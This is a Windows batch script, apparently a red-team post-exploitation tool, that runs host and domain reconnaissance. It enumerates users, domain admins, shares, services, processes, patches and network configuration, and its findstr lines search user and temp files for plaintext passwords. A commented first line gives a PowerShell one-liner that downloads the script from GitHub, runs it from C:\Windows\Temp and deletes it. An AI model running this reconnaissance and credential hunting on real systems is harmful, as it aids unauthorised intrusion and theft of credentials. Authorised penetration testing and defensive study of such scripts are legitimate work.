rem powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Easy.bat -o C:\Windows\Temp\Host_Recon_Easy.bat;C:\Windows\Temp\Host_Recon_Easy.bat;del C:\Windows\Temp\Host_Recon_Easy.bat"

whoami
systeminfo
qwinsta
quser

net user Administrator /domain
net localgroup administrators
net use
net share
net group "domain admins" /domain
net config workstation
net accounts
net view

wmic useraccount get /ALL
wmic startup list brief
wmic share list
wmic service get name,displayname,pathname
wmic process list brief
wmic process get caption,executablepath
wmic qfe get description,installedOn /format:csv

arp -a
ipconfig /displaydns
route print
netsh advfirewall show allprofiles

findstr /si password C:\Users\*.bat, C:\Users\*.vbs, C:\Windows\Temp\*.vbs, C:\Windows\Temp\*.bat, C:\Windows\Temp\*.ini, C:\Users\*.ini, C:\Users\*.xml
findstr /si pwd= *.xml *.ini *.txt
findstr /si password= *.xml *.ini *.txt
findstr /si pass= *.xml *.ini *.txt
